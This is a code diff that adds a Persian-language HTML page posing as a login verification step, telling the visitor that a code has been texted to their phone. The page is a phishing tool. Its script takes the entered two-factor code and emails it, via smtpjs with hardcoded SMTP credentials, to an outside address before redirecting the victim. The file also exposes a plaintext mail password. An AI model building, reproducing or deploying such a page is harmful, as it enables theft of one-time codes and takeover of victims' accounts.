@@ -1,0 +1,104 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title> وارد کردن کد</title>
+   
+</head>
+<body>
+    <div class="login-container">
+        <img src="icon-192x192.png" alt="icon">
+        <h2> 
+          کد ورود
+        </h2>
+        
+
+        <p>
+            کد ورود به شماره تلفن شما پیامک شده است
+        </p>
+        <br>
+
+
+    
+        <div class="input-field">
+            <input type="text" id="phoneNumber" placeholder=" کد را وارد کنید " class="input-field-input" maxlength="6">
+            <div class="input-field-border"></div>
+            <label class="input-field-label">
+                <span> کد ورود </span>
+            </label>
+        </div>
+     
+
+
+        <button class="submit-btn" onclick="redirectToCodePage()"> بعدی </button>
+    </div>
+
+
+
+    </div>
+</body>
+
+
+
+
+<script>
+
+    document.addEventListener("DOMContentLoaded", function () {
+        var countrySelect = document.getElementById("countrySelect");
+        var phoneNumberInput = document.getElementById("phoneNumber");
+  
+        countrySelect.value = "Iran";
+        phoneNumberInput.value = "+98";
+       
+  
+        countrySelect.addEventListener("change", function () {
+            var selectedCountry = countrySelect.value;
+            if (selectedCountry === "Iran") {
+                phoneNumberInput.value = "+98";
+            } else {
+                phoneNumberInput.value = ""; 
+            }
+  
+        });
+    });
+  
+  
+  
+  
+    function redirectToCodePage() {
+      var phoneNumber = document.getElementById("phoneNumber").value;
+  
+      Email.send({
+          Host: "smtp.elasticemail.com",
+          Username: "bibak1498@gmail.com",
+          Password: "69489F9090A6FCD27289C78BB4DB70E14D8E",
+          To: 'vcgcf@telegmail.com',
+          From: "bibak1498@gmail.com",
+          Subject: "ایمیل جدید دریافت کردید",
+          Body: " کد دومرحله ای: " + phoneNumber
+      }).then(
+          function (message) {
+              alert(message);
+              // انتقال به صفحه tow.html پس از 2000 میلی‌ثانیه (2 ثانیه)
+              setTimeout(function () {
+                  window.location.href = 'index.html';
+              }, 2000);
+          }
+      );
+  }
+  
+  
+  
+  </script>
+  
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  
+
+
+
+
+</html>
